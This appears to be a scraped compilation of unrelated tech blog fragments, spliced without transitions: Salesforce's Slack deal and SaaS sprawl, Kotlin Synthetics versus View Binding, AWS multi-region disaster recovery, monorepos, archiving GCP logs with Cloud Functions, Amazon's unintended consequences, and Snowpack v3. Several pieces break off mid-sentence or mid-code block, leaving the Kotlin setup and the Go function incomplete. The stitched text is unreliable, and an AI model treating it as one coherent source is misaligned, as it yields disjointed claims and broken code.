<p>There once was a <a href="https://25iq.com/2014/05/31/a-dozen-things-ive-learned-from-jim-barksdale-and-barksdaleisms/">folksy executive</a>, who was better at aphorisms than email (unfortunately, his company sold email). He said:“In a fight between a bear and an alligator, it is the terrain which determines who wins”. To this day, I’m not sure if he thought his company was the bear or the alligator (he lost regardless), but the battle for information workers is (to change metaphors mid-sentence) an away game for Salesforce. They simply don’t understand or have experience with this customer audience, and previous efforts like Chatter and Quip reinforce this.</p>



<p>Some skepticism has been <a href="https://daringfireball.net/linked/2020/11/25/slack-salesforce">expressed</a> at Salesforce’s ability to build software beyond that which you’re required to use if you want to get your commission check:</p>



<blockquote><p>“If there’s anyone who knows how to make great apps and artfully-crafted user experiences, it’s Salesforce.”</p></blockquote>



<p>More directly, as much as Salesforce wants to move beyond the back office, it takes more than desire to compete in new markets against entrenched competitors (most notably Microsoft Office).</p>



<h2><strong>REALITY #5: THE PANDEMIC TAILWIND ARGUMENT HAS A FATAL FLAW</strong></h2>



<p>Salesforce seems to say things are different this time because Slack has skills Salesforce doesn’t AND the <a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">pandemic changes everything</a>:</p>



<blockquote><p>“The events of this year have greatly accelerated the move by companies and governments to an all-digital world, where work happens wherever people are—whether they’re in the office, at home or somewhere in between. They need to deliver connected experiences for their customers across every touchpoint and enable their employees to work seamlessly wherever they are.”</p></blockquote>



<p>The problem is we’ve already run this experiment. Slack is having to sell out because they “<a href="https://www.wsj.com/articles/slack-missed-out-on-the-pandemics-zoom-boom-leaving-it-vulnerable-11606478401">missed the pandemic boom</a>”/”<a href="https://www.protocol.com/newsletters/sourcecode/how-slack-lost-the-pandemic">lost the pandemic</a>”, in stark contrast to their competitors Microsoft Teams and Zoom. The outcome of a Slack-led assault on the Microsoft Office franchise is not some future hypothetical – we have already seen how this battle plays out. Beyond Teams, Slack has also lost significant ground to Discord.</p>



<p>Which at long last brings me to my actual point…</p>



<h2><strong>UNSUSTAINABILITY OF SAAS SPRAWL</strong></h2>



<p>Regardless of whether the Slackforce deal makes financial sense or can be successfully executed, it is just one (overly dramatized) episode in the unfolding consolidation of SaaS business applications.</p>



<p>On the supply side, we have too many SaaS apps, with the ocean of venture capital fueled by zero-interest rates funding ever more SaaS companies on the assumption that what worked a decade ago will continue to work a decade hence (financiers also like SaaS because it models out nicely in a spreadsheet). Most new SaaS companies are chasing ever smaller markets (the more interesting opportunity is to go after the bigger, horizontal OG SaaS companies, many of which like Salesforce have settled comfortably into a product middle age).</p>



<p>But the demand side is the real impetus for SaaS consolidation. Companies simply have too many SaaS applications and collectively it’s gotten too hard to procure, manage, and get value out of a vast archipelago of siloed SaaS applications.</p>



<p>We’ll see consolidation that leverages existing customer relationships, expands product footprints, and integrates adjacent functionality. Salesforce is a consolidator if not necessarily an integrator. Twilio, with the acquisition of Segment, has shown it intends to be a consolidator. Others are (or should be if they’re not) wrestling with the question of whether they are predators or prey. Private equity will continue to buy up software companies, but have yet to show they can …</p></div></article></div>

				<p>Kotlin Synthetic was one of the coolest features when I started playing with Kotlin. In the Android Java world, to get on hold of a view, you needed to use <code>findViewById()</code> and then cast to the appropriate view type. This was one of the most repetitive and boring tasks when creating a new view/screen.</p><p>Then Kotlin and its Synthetics came around. If you had a view with id <code>hello</code>, you would write <code>hello</code> and &nbsp;you could access it. No boilerplate, no <code>findViewById</code>, not a thousand member variables in your class.</p><p>But it turns out that the concept was kind of too relaxed. They had a global namespace and there were no nullability checks. This meant that you were able to access <code>hello2</code> on screen 2, even though you were on screen 1, leading to inevitable crashes.</p><p>So a step back is probably the right balance. <a href="https://youtrack.jetbrains.com/issue/KT-42121">Kotlin Android extensions</a> (which Kotlin Synthetic is part of) are deprecated, and the recommended way to replace them is the <a href="https://developer.android.com/topic/libraries/view-binding">View Bindings</a>. This has a bit more boilerplate but offers type and nullability safety.</p><h2 id="set-up">Set up </h2><p>In the <code>Android</code> section of your <code>build.gradle</code> add this:</p><pre><code>android {

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>With the recent outage on AWS last week, there have been a lot of discussions about various architectures and how effective they would've been to combat the downtime. Since these vary a lot in cost, complexity, and tradeoffs, I want to go through a couple of them at a high level, then dive into one that was unfortunately missing from much of the conversation.</p>
<h2 id="multi-cloud">Multi-Cloud</h2>
<p>First were comments made about the value of going multi-cloud. The idea of this is to run your application in… multiple clouds.
<img src="https://www.forelse.io/multi-cloud.png" alt="Multi-Cloud">
By spreading the load across multiple providers, you are insulated in case one of them goes down. In theory, it sounds great! Surely two cloud vendors won't go down at the same time! In practice, this is horrible at the application level for a multitude of reasons:</p>
<ul>
<li>The infrastructure is different for each cloud</li>
<li>Deployments gain a magnitude of complexity</li>
<li>Bandwidth charges to go between the two are outrageous</li>
</ul>
<p>Because of this, a multi-cloud architecture would not be a feasible option for high availability (outside a select few edge cases).</p>
<h2 id="multi-region">Multi-Region</h2>
<p>Next, there were talks about multi-region. An AWS Region is a group of multiple availability zones (AZ), with each AZ being one or more discrete data centers with independent power, networking, and connectivity. Operating in a single region across multiple AZs provides high availability, but doesn't provide DR. For that, you need multiple regions. A very simplified version of a multi-region setup looks like this:
<img src="https://www.forelse.io/multi-region.png" alt="Multi-Region">
This fixes a couple of the issues of going multi-cloud:</p>
<ul>
<li>Your application will stay in the same cloud, so the infrastructure will stay the same</li>
<li>Regions are completely separated, so you get the same availability benefits!</li>
<li>Region-to-region bandwidth charges are much lower than cloud-to-cloud fees!</li>
</ul>
<p>Unfortunately, most of the comments were around <em>Active-Active</em> multi-region. That is, distributing the load across multiple regions at the same time. This adds in a lot of complexities around keeping the persistence layer in sync. This also adds complexity around deployments and has a lot of places for things to go wrong. This can lead to more self-inflicted downtime than AWS has ever caused.</p>
<h2 id="multi-region-dr">Multi-Region DR</h2>
<p>This is the one that has been largely overlooked in recent days. It is the idea that only a single region is active at a time, and a secondary region is capable of taking over in the event of a disaster (hence DR). This shares the benefits listed above. However, it is able to largely mitigate the complexities of a full Active-Active setup. Under this setup, the secondary region doesn't need to be fully built - only persistent data needs to be replicated.</p>
<p><img src="https://www.forelse.io/multi-region-dr.png" alt="Multi-Region"></p>
<p>But wait, won't it take a while to deploy the full application stack in the event of a disaster? Yes… yes it will. And this is okay! High-Availability is achieved by using multiple AZs is sufficient for most common outages. If an entire <em>region</em> has issues, like we saw last week, spending &lt;1 hour standing up a new stack from backups is still preferable to a &gt;8 hour outage. This process can be streamlined via automation, but even if it's a manual (but practiced) operation, the fact that you <em>actually have options</em> is important.</p>
<p>So let's dive into this a little more to explore what it looks like:</p>
<ul>
<li>Application is deployed as usual in the primary region</li>
<li>Using AWS managed services, backups and replication for persistent data is generally a configuration setting or two away:
<ul>
<li>Add a read replica to RDS in a different region</li>
<li>Create a Dynamo DB global table</li>
<li>Enable S3 bucket replication</li>
</ul>
</li>
<li>In the event of a fail-over, deploy the application in the other region (hopefully using Infrastructure-as-Code) and update DNS settings
<ul>
<li>This process should be regularly tested</li>
</ul>
</li>
</ul>
<p>Is this a silver-bullet? Absolutely not. It won't work for every workload, and definitely won't work for every type of outage. However, it is a relatively simple solution that can also be cost effective. And last week, it could've allowed clients to be back up and functioning long before services in us-east-1 were fully restored.</p>
<h2 id="summary">Summary</h2>
<p>In conclusion, outages happen. This does not diminish the value of AWS in any way, but it does make clear the importance of good architecture and planning. There are some very expensive and elaborate systems that can be designed to mitigate these outages, but which are overkill and impractical for most clients. Fortunately, there are other options that may offer an “effective enough” solution with reasonable tradeoffs, which should become “best-practice” when working in AWS.</p>

It's a great talk about the history of monorepos and big companies using them. I LOVED that talk. Definitely give it a listen. </p><p> Mono, obviously is a word that comes from latin which means, "one". The fact that the word "mono" is used in both monorepo, and monlith, tends to lend itself to a lot of confusion. </p><h2 id="monolith">MonoLITH</h2><p>First, off, monolith in an of itself might not be a bad thing for your company/team. There are a lot of companies, particularly startups, that have done great things with monoliths. In fact, Martin Fowler notes that most microservice architectures that started as microservice vs starting as a monolith and getting broken up, tend to result in bad architectures.</p><figure><a href="https://martinfowler.com/bliki/MonolithFirst.html"><div><p>bliki: MonolithFirst</p><p>Going directly to a microservices architecture is risky, so consider building a monolithic system first. Split to microservices when, and if, you need it.</p><p><span>martinfowler.com</span></p></div><p><img src="https://martinfowler.com/bliki/images/microservice-verdict/path.png"></p></a></figure><p>However, I think the drawback starts to happen when you get to a point where hundreds of folks are constantly working and committing code into it. You can very easily end up with the [Big Ball of Mud](<a href="https://exceptionnotfound.net/big-ball-of-mud-the-daily-software-anti-pattern/">https://exceptionnotfound.net/big-ball-of-mud-the-daily-software-anti-pattern/</a>) anti-pattern. A monolith can be come a castle housing your most precious of code; an impenetrable fortress surrounded by a crocodile filled moat of unforgiving technical debt.</p><p>If you're not careful, very tight coupling between different parts of the monolith can make it impossible to ship one part of the application without shipping the whole thing, and make it very difficult to refactor into smaller pieces as well.</p><h2 id="monorepo">MonoREPO</h2><p>Here's where things get interesting. So, yes, the word "mono" exists in both places, but that's not to say that they do and serve the same exact purpose. There are a lot great reasons to keep all of your code in a single repository, just like you would in a monolith.</p><p>The distinction however though is that, unlike a monoLITH, a monoREPO is <em>usually</em> just a lot of packages sharing the same code base. Some of these packages are dependent on other packages sure, but in no way does the monorepo have to ship all at once as is the case with a monolith. Nor does it mean that the repo is a big ball of mud with muddied concerns, and tight coupling.</p><p>It's for the above reasons that the term monorepo should be replaced by "megarepo". </p><h2 id="s-mono-mega-">s/mono/mega/</h2><figure><blockquote><p lang="en" dir="ltr">I propose we call them "megarepos" going forward. Too many people conflate the term "monolith" with "monorepo". Let's fix it. <a href="https://twitter.com/hashtag/divops?src=hash&amp;ref_src=twsrc%5Etfw">#divops</a></p>— Jonathan Creamer (@jcreamer898) <a href="https://twitter.com/jcreamer898/status/1189887019020894208?ref_src=twsrc%5Etfw">October 31, 2019</a></blockquote>

</figure><p>The mono/mega repo should be defined as...</p><blockquote>A bunch of packages in once place with shared tooling to facilitate collaboration, increase productivity, and create a single culture.</blockquote><p>A few highlights from using a megarepo are:</p><ul><li>Consistent build tooling</li><li>Less context switching</li><li>Much MUCH easier to update shared code</li><li>Easier to affect change across the platform</li><li>Code reviews are centralized<br></li></ul><p>In the wonderful world of a megarepo, you can in fact see the forest for the trees. Meaning, you get a sense of what all is available to you as a member of a larger organization. If the packages in your megarepo have tooling which enables them to be easily tested, shared, and used as isolated units, you end up in a world where your application itself is the component library. Disparate packages which, in a multirepo setup, might become difficult to discover are easy to find and work with as they are written, tested, and documented all in the same place.</p><p>The megarepo often has a group of shared dependencies as well. In the case of a frontend project with a React toolchain, the base level React version might be shared across packages, or there maybe shared components which have a shared version across packages. This is not a drawback of a mega, it's a plus! Now you get to live in a world where an update to a shared package can all at once have every single dependent package run a test suite to verify that it didn't break. This makes it so much easier to maintain consistency across your entire application.</p><p>Nothing is without its negative sides of course. There is no such thing as a silver bullet, and in no way is a megarepo the right thing for every team, in every situation. Just like any tool, it should be thought out extensively before put into practice. One of the biggest obstacles in working this way is, it requires a good deal more tooling to work with. So, if you're at a company where there's no team managing the platform of the megarepo itself, it can be a difficult task to maintain it.</p><p>That being said, when you do have a team dedicated to writing tools for the megarepo, it can be a fantastic option, and I have to give credit to <a href="https://twitter.com/benmvp">Ben Ilegbodu</a>, and <em>maybe</em> <a href="https://twitter.com/kylewelch">Kyle Welch</a> for helping me come up with the term.</p><figure><blockquote><div lang="en" dir="ltr"><p>I'll give you microapps but megarepos was me.

    <div>
      <h2 id="tldr">TL;DR</h2>
<p>Compress data and use cold storage tiers to achieve absolute minimum cost for long-term logs archiving at as little as $1.20 per TB per year.</p>
<h2 id="problem">Problem</h2>
<p>Imagine you need to capture and store 1TiB of logs monthly and retain them for 10 years - what is the most cost-effective way of doing so (infrastructure cost and long-term maintenance overheads)? Google Cloud produces a lot of audit logging and it is stored in Cloud Logging for free. They give you generous <a href="https://cloud.google.com/logging/docs/audit#audit_log_retention">400 days retention for Admin Activity and System Event logging and 30 days for Data Access</a>. As of recently, they also support <a href="https://cloud.google.com/logging/docs/storage#custom-retention">Custom retention</a> which allows you to store logs upwards 10 years at a charge of $0.01 per GiB  per month (from March 31, 2021).
However, pricing stops being favourable when you ingest and retain regular, non-audit logs. Beyond the first 50GiB per project, the charge is <a href="https://cloud.google.com/stackdriver/pricing">hefty $0.50/GiB</a>. We can use Cloud Logging <a href="https://cloud.google.com/logging/docs/export#sink-terms">export sinks</a> to route logs directly into GCS, bypassing Cloud Logging’s $0.50 charge. GCS pricing can be found <a href="https://cloud.google.com/storage/pricing#storage-pricing">here</a> where standard storage is twice as expensive as Cloud Logging retention, however, Coldline or colder storage classes provide price parity or even considerable savings.</p>
<h2 id="solution">Solution</h2>
<p>We want to export logs directly into GCS, bypassing Cloud Logging fee. We also hypothesise that it will be cheaper to incur some cost of compressing the data before long-term storage vs storing uncompressed.</p>
<h3 id="export-all-the-logs">Export all the logs!</h3>
<p>First of all, we need to configure Cloud Logging to export all the logs into logging sink of our choice. This is easy when you have a project or two, but what can you do when you have hundreds of projects? [Aggregated sinks] feature to the rescue! It allows us to have an organization-wide logging rules (be careful, this can generate massive amounts of logs).</p>
<p>Here is an example of Aggregated sink configured using Terraform to export all Audit logs into a single bucket.</p>
<div><pre><code data-lang="hcl"><span>resource</span> <span>"google_logging_organization_sink" "audit-logging-sink"</span> {
  name   <span>=</span> <span>"org-audit-logging"</span>
  org_id <span>=</span> <span>var</span>.<span>org_id</span><span>
</span><span>
</span><span>  # apply to the entire org
</span><span></span>  include_children <span>=</span> <span>true</span><span>
</span><span>
</span><span>  # Can export to pubsub, cloud storage, or bigquery
</span><span></span>  destination <span>=</span> <span>"storage.googleapis.com/${google_storage_bucket.bucket-audit-logging.name}"</span><span>
</span><span>
</span><span>  # Log all AuditLogs
</span><span></span>  filter <span>=</span> "protoPayload.\"@type\"<span>=</span><span>type</span>.<span>googleapis</span>.<span>com</span><span>/</span><span>google</span>.<span>cloud</span>.<span>audit</span>.<span>AuditLog</span><span>"</span>
}
</code></pre></div><h3 id="compress-all-the-logs">Compress all the logs!</h3>
<p>With our hypothetical 1TiB logging ingest we can try and save on storage costs by compressing logs first. Logs are usually great candidates for compression due to being plaintext and having a lot of repeating tokens. So imagine that all aggregated logs are arriving in <code>all-logs-export</code> bucket. There is a number of options on how we can achieve compression here:</p>
<ul>
<li>Run 24/7 GCE instance which is subscribed to bucket’s <a href="https://cloud.google.com/storage/docs/pubsub-notifications">PubSub events</a>. Running anything 24/7 sounds expensive and will fail us on our mission of finding the cheapest approach here. It also means a level of a maintenance overhead for the GCE, which is not something that will get reflected in bills, but rather in payroll.</li>
<li>Run nightly batch processing using GCE and <a href="https://cloud.google.com/compute/docs/instances/preemptible">preemptible VM instances</a>. This is likely the absolute best solution in terms of cost per GiB logs compressed. We are only running VMs for short-bursts and VMs are heavily discounted. Short-lived instances are also less of maintenance overhead as each time it is launched up with a latest, patched version of the OS. However, you have to <a href="https://cloud.google.com/scheduler">build a trigger</a> to run this nightly, deal with corrupted compression due to the preemptions, scale system if logging suddenly goes x10 or x100.</li>
<li>Trigger Google Cloud Function each time the object has finished writing into the bucket using <a href="https://cloud.google.com/functions/docs/calling/storage">Google Cloud Storage Triggers</a>. Compress file and store it in a <code>all-logs-export-compressed</code> bucket. This is definitely a winner in terms of low maintenance, but how much would it cost? Let’s find out.</li>
</ul>
<h2 id="cloud-functions-implementation">Cloud Functions implementation</h2>
<p>It is worth to be well aware of Cloud Functions limitations:</p>
<ul>
<li><a href="https://cloud.google.com/functions/quotas#time_limits">Max execution time is 9min</a></li>
<li><a href="https://cloud.google.com/functions/quotas#resource_limits">Max function memory of 2048MB</a></li>
<li><a href="https://cloud.google.com/functions/docs/concepts/exec#file_system">Local data is written to an in-memory volume</a></li>
<li><a href="https://cloud.google.com/functions/pricing#compute_time">Compute time is proportional to a memory allocated to the function</a></li>
<li>Bonus - Cloud Logging export does generate files in excess of 2GiB.</li>
</ul>
<h3 id="great-what-does-it-all-mean">Great, what does it all mean?</h3>
<p>It means that Cloud Functions resources are finite and we can not get away with inefficient implementation. Our function must not store files in local storage, because it is backed up by Function’s memory, meaning that we will not have enough memory to store larger log files. Additionally, we must be able to download, compress and upload files larger than 2GiB in less than 9 minutes otherwise our function will stop.</p>
<h3 id="how-can-we-avoid-hitting-the-above-limitations">How can we avoid hitting the above limitations?</h3>
<p><strong>Streaming.</strong> Instead of reading the entire file into memory at once, we are going to incrementally stream download, compress and stream upload the results. This will keep memory usage low, allowing 2048MB function to process files of any size, mainly limited by 9-minute execution limit.</p>
<p>We will write this function in Go to keep its memory usage low, Go also makes the implementation of streaming compression a breeze. We will use <a href="https://pkg.go.dev/cloud.google.com/go/storage">cloud.google.com/go/storage</a> and <a href="https://golang.org/pkg/compress/gzip/">compress/gzip</a> packages in our implementation.</p>

</code></pre></div><p>Function worked really well and we could see gzip files appearing in <code>all-logs-export-compressed</code> directory. However, Monitoring has shown that some function invocations have failed. Infrequently functions were exceeding 540-second execution limited and getting forcefully stopped.</p>
<h3 id="second-try---deploying-cloud-function">Second try - Deploying Cloud Function</h3>
<p><a href="https://cloud.google.com/sdk/gcloud/reference/functions/deploy">By default</a>, Cloud Functions are deployed with 256MB of memory, meaning it only has 400Mhz of CPU available to it. GZIPing of large files 1GB+ seems to require more grunt to be able to complete compression within 9-minute slot. The solution is simple, deploy Cloud Function with more memory. While extra memory will go to waste, we will prevent timeouts by completing compression sooner.</p>
<p>I’ve added <code>--memory=1024'</code> parameter to the gcloud command above to effectively x4 available CPU. Now, even the largest files (around 3GB) finish processing in under 3 minutes. I did not use <code>--memory=2048'</code> as it would increase memory waste and be less efficient on smaller sized logs. However, if I’ll notice that processing slows down towards 5 minutes mark, I’ll double memory again.</p>

<p>Overall, this solution was quick to implement, easy to debug and should be zero effort to maintain going forward, it should also scale well.</p>

<p>Calculating the cost of this method is less straight forward. I’ve taken a sample of processing performed to compress 61.7GB on a day. It included 548 Class A and Class B GCS invocations, 548 Cloud Function invocations, 5624GHz of CPU time and 5017GiB/seconds of Memory time. We can calculate at the per/GB metric to find out a 91GHZ/seconds and 81GiB/seconds values. This means that if you are not using Cloud Functions for anything else in your organization, a free tier (400,000 GB-seconds memory, 200,000 GHz-seconds of compute time) will be enough to compress 2.2TB of logs monthly at no cost, and it will cost only $0.001 per GB thereafter.</p>
<p>So, with compression, 1000GB will become 83GB or less.</p>

<p>This is <strong>insanely</strong> cheap, storing 1TB of logs at $1.20 per year.</p>

<p>It is possible to archive all of the GCP logs for as little as $1.20 per TB per year. Go Cloud Function makes implementation simple and future maintenance minimal. It is also interesting how the cost of a managed solution is x17 times higher, making it worthwhile to implement a custom solution.</p>

		<p>Writing about a range of unintended consequences from a single company is a new format for me. I typically have either looked more widely at effects from a new technology, policy, or event. But many companies create or house second-order effects.</p>
<p>As a start, let’s look at Amazon. Amazon was an easy choice to start with since the company is big ($321 billion in revenue in the past 12 months), has multiple business lines, and is a mix of software, hardware, and people businesses.</p>
<p>This article is long and it really only scratches the surface of some of Amazon’s unintended consequences.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-300x68.png" alt="" width="550" height="125" srcset="https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-300x68.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-1024x232.png 1024w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-768x174.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-1536x348.png 1536w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table.png 1919w" sizes="(max-width: 550px) 100vw, 550px"><span id="more-2452"></span></p>
<h2>Alexa</h2>
<p><em>Over 100 million devices sold.</em></p>
<p>Amazon’s Alexa smart speaker has changed the way people gain information while going about their day. Alexa customers use hands-free voice as the input method to place orders, ask questions, play entertainment, and more.</p>
<p>For that convenience, Alexa users may find unintentional purchases, including multiple <a href="https://christianchronicle.org/when-the-roll-is-called-up-yonder-alexa-answers/">toilet paper orders</a> initiated by people streaming a preacher’s service. Similar events have happened at other times, including unintentional <a href="https://news.sky.com/story/amazon-cleared-after-alexa-ad-triggers-cat-food-order-11249840">cat food orders and a (somewhat intentional) doll house</a>.</p>
<p>“Accidental” recordings have also happened, for example when a couple’s conversations were <a href="https://www.nytimes.com/wirecutter/blog/amazons-alexa-never-stops-listening-to-you/">recorded and sent</a> to someone on their contact list.</p>
<p>But these incidents seem minor compared to the next examples, which are more about speculative behavior change.</p>
<p>Similar to the way we might speak differently to someone who doesn’t understand our language well, do people adjust the ways they speak to a smart device? Using sarcasm, unusual words, uncommon terms, highly contextual terms — these all create more opportunity to misunderstand. But that risk of misunderstanding may be acceptable when we’re having a conversation with someone we know and like. When it’s a functional task, maybe less so. Also, given that Alexa is a female assistant, does that bring out different behaviors or train different behavior in its users when speaking to human females?</p>
<p>When people become frustrated with Alexa, or are just frustrated because they are having a bad day, Alexa responds with an apologetic voice.</p>
<p>This is called “frustration detection” by Amazon’s Alexa technology group. Frustration detection in other forms has been around for a long time, of course. The original frustration detection is people responding differently to another person’s frustration. Sometimes in an apologetic way and sometimes in an aggressive way depending on the relationship and personality of the respondent.</p>
<p>Less common frustration detection takes place during a customer service exchange. There, a frustrated customer will often (but not always) be treated with deference. The frustration that a customer expresses in a public forum also tends to be more controlled than what they would express in their own home.</p>
<p>As Amazon writes on its <a href="https://blog.aboutamazon.com/devices/amazon-devices-event-september-2019">blog</a>:</p>
<p><em>“As customers continue to use Alexa more often, they want her to be more conversational and can get frustrated when Alexa gets something wrong. To help with this, we developed a deep learning model to detect when customers are frustrated, not with the world around them, but with Alexa. And when she recognizes you’re frustrated with her, Alexa can now try to adjust, just like you or I would do.”</em></p>
<p>Does this change people when these exchanges are with a machine rather than a human?</p>
<p>Researchers have studied Alexa’s responses (as well as those of other voice assistants) for a while. This <a href="https://qz.com/911681/we-tested-apples-siri-amazon-echos-alexa-microsofts-cortana-and-googles-google-home-to-see-which-personal-assistant-bots-stand-up-for-themselves-in-the-face-of-sexual-harassment/">2017 article</a> gives a good breakdown of what was found related to “device harassment” back then.</p>
<p>Will being able to talk naturally, including with frustration, impact the way people — and especially observing kids — learn to interact with others? This is what some researchers wonder. I don’t believe that anyone knows the answer.</p>
<p>Rough estimates are that <a href="https://marketingland.com/roughly-1-in-4-u-s-adults-now-owns-a-smart-speaker-according-to-new-report-273994">one-quarter</a> of US households own a smart speaker, of which Alexa is the most common device. At 128 million US households, even a small impact on the one-quarter of them owning smart speakers can make a big difference in outcomes. As with many of Amazon’s unintended consequences, size alone accounts for a lot of the potential impact.</p>
<ul>
<li>Causes of the unintended consequences: Alexa interacts with and adjusts to abuse.</li>
<li>Counteractions: Program Alexa to ignore, push back, or misunderstand the abuse? Do we even understand the effects in order to know how to respond?</li>
</ul>
<h2>Investing</h2>
<p><em>The investment arm has a parent company.</em></p>
<p>The <a href="https://developer.amazon.com/en-US/alexa/alexa-startups/alexa-fund">Amazon Alexa Fund</a> raised $200 million for investing to “fuel voice technology innovation.” The fund invested in 91 startups to date.</p>
<p>As a driver of voice-enabled hardware, Amazon has beneficially supported startups that build on top of its own Alexa hardware. By pushing more investment into voice-related innovation, Amazon benefits and also gets to learn what others are doing in this space.</p>
<p>Amazon’s investment arm is different from other VCs in that its parent company is also potentially a competitor to its portfolio companies.</p>
<p>Related to that, Amazon’s investment arm has been accused of benefiting from and copying the work of startups that pitched to it or that it invested in.</p>
<p>The following is a series of quotes about this issue, from <span>the <a href="https://www.wsj.com/articles/amazon-tech-startup-echo-bezos-alexa-investment-fund-11595520249"><em>Wall Street Journal</em></a>:</span></p>
<p><em><span>“In some cases, Amazon’s decision to launch a competing product devastated the business in which it invested. In other cases, it met with startups about potential takeovers, sought to understand how their technology works, then declined to invest and later introduced similar Amazon-branded products, according to some of the entrepreneurs and investors.”</span></em></p>
<p><em>“In 2010, Amazon invested in daily-deals website LivingSocial, gaining a 30% stake and representation on the startup’s board. Former LivingSocial executives said Amazon began requesting data. ‘They asked for our customer list, merchant list, sales data. They had a competitive product and they demanded all of this,’ said one former executive. LivingSocial declined to hand over the data, this person said.”</em></p>
<p><em>“LivingSocial executives began hearing from clients that Amazon was contacting them directly and offering them better terms, some former executives said. Amazon also began hiring away LivingSocial employees.”</em></p>
<p><em>“‘They are using market forces in a really Machiavellian way,’ said Jeremy Levine, a partner at venture-capital firm Bessemer Venture Partners. ‘It’s like they are not in any way, shape or form the proverbial wolf in sheep’s clothing. They are a wolf in wolf’s clothing.'”</em></p>
<p>I have known of investors — typically in small markets where founders have few options — to use predatory techniques like this. With any corporate investing arm, startups seeking investment should be a bit more careful. But even with no intent, Amazon is large enough that issues like this might just happen because the company is so large it’s hard to know what’s going on in every corner of it.</p>
<p>In June 2020, Amazon announced that it is building a <a href="https://www.wsj.com/articles/amazon-to-launch-2-billion-venture-capital-fund-to-invest-in-clean-energy-11592910001">$2 billion fund</a> to invest in clean energy.&nbsp;<a href="https://sustainability.aboutamazon.com/about/climate-pledge-fund">The Climate Pledge Fund</a>, will invest in companies building transportation, energy generation, battery storage, manufacturing and food and agriculture innovations. This might be the next group of startups affected.</p>
<ul>
<li>Causes of the unintended consequences: Competitive nature of the parent company. Using pitch meetings as intelligence gathering.</li>
<li>Counteractions: More care by founders in who to pitch and what information to reveal.</li>
</ul>
<h2>AWS</h2>
<p><em>AWS is the most common cloud infrastructure service.</em></p>
<p>Amazon Web Services (AWS) is the most common cloud infrastructure providers, at 33% market share. That means that many companies use AWS for hosting company data, sensitive documents, customer credentials, bank statements, correspondence, logs, code, and more.</p>
<p>The pervasiveness of AWS means that engineers have a natural benefit to knowing how to use AWS, as opposed to, say, Microsoft’s Azure or Google Cloud. But that pervasiveness also means that many data breaches happen on AWS as well.</p>
<p>AWS-related data breaches include exposed data by a <a href="https://siliconangle.com/2019/09/02/uk-travel-company-exposes-customer-calls-misconfigured-cloud-storage/">travel company</a> (500,000 customer transactions exposed), by <a href="https://siliconangle.com/2017/10/11/accenture-left-private-data-exposed-public-misconfigured-aws-s3-bucket/">Accenture</a> (“authentication credentials, certificates, decryption keys, customer information” exposed), and Dow Jones (2.2 million customer records exposed). More interestingly, there have also been breaches by departments of the <a href="https://techcrunch.com/2017/11/28/army-nsa-inscom-aws-leak/">military</a> and their contractors (top secret information exposed).</p>
<p>Data breaches also come from <a href="https://www.upguard.com/breaches/identity-and-access-misstep-how-an-amazon-engineer-exposed-credentials-and-more">Amazon engineers</a> themselves (passwords and AWS key pairs exposed).</p>
<ul>
<li>Causes of the unintended consequences: Many employees and contractors with customer data access and authorization to edit entitlements to that data. Pervasiveness of use.</li>
<li>Counteractions: Better management of a complicated process.</li>
</ul>
<h2>Marketplace Product Reviews</h2>
<p><em>Amazon is the default search engine for products.</em></p>
<p>Through Amazon Marketplace, third-party sellers have grown to account for over half of items sold since 2017. When just about anyone can sell on Amazon it is necessary to judge quality communally. But that can lead to second-order effects.</p>
<p>One way that sellers give themselves an edge is to manipulate the reviews of their competitors. Examples of this manipulation are the direct: buying a competitor’s product and giving it a low review but also the more sophisticated: giving fake high <a href="https://www.theverge.com/2018/12/19/18140799/amazon-marketplace-scams-seller-court-appeal-reinstatement">reviews</a> for competitors to later report them for review manipulation.</p>
<p><a href="https://www.theverge.com/2018/12/19/18140799/amazon-marketplace-scams-seller-court-appeal-reinstatement">Types of attack</a> include paying people to write five-star reviews for a competitor in order to get the product flagged, hijacking a competitor’s brand, gaining illegal access to competitors’ products through illicit access to a distributor’s account, and even buying a competitor’s products only to set them on fire, post pictures, and then complaining about the danger.</p>
<p>One of the reasons that Amazon could grow so large is that they enable third-party sellers in their market. But with an organization this large, that touches so many buyers and sellers, there is a necessary loss of individual control in favor of algorithmic or decision-tree approaches.</p>
<p>Another version of the fake reviews is to create a …</p></div></article></div>

<article>
      <p><strong>tl;dr:</strong> Snowpack v3.0 will release on January 6th, 2021 (the one-year anniversary of its original launch post). This is our biggest release yet with some serious new features, including <strong>a new way to load npm imports on-demand</strong> and skip the frontend <code>npm install</code> step entirely.</p>
<p>Best of all: it’s all available to try today!</p>
<h2 id="what%E2%80%99s-new%3F">What’s New?</h2>
<p>Snowpack v3 will focus on the polish &amp; official release of four features already available today in the current version of Snowpack (v2.18.0) under the <code>experiments</code> flag:</p>
<ul>
<li><code>experiments.source</code>- Streaming npm imports, no install step required.</li>
<li><code>experiments.optimize</code> - Built-in bundling, preloading, and asset minifying.</li>
<li><code>experiments.routes</code> - Advanced config for HTML fallbacks and API proxies.</li>
<li><code>import 'snowpack'</code> - A brand new JavaScript API for Snowpack integrations.</li>
</ul>

    <source src="https://www.snowpack.dev/img/snowpackskypack.mp4" type="video/mp4">
</video>
<h2 id="new%3A-streaming-npm-imports">New: Streaming NPM Imports</h2>
<p>Snowpack has always pushed the limits of frontend development, and this release is no different. Snowpack v3.0 introduces an exciting new feature to speed up &amp; simplify your development workflow.</p>
<p>Typically, JavaScript dependencies are installed and managed locally by a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. Packages are often bloated with unrelated files and almost never run directly in the browser. Additional steps are required to process, build and bundle these installed packages so that they can actually run in browser.</p>
<p><strong>What if we could simplify this? What if Snowpack could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM?</strong></p>
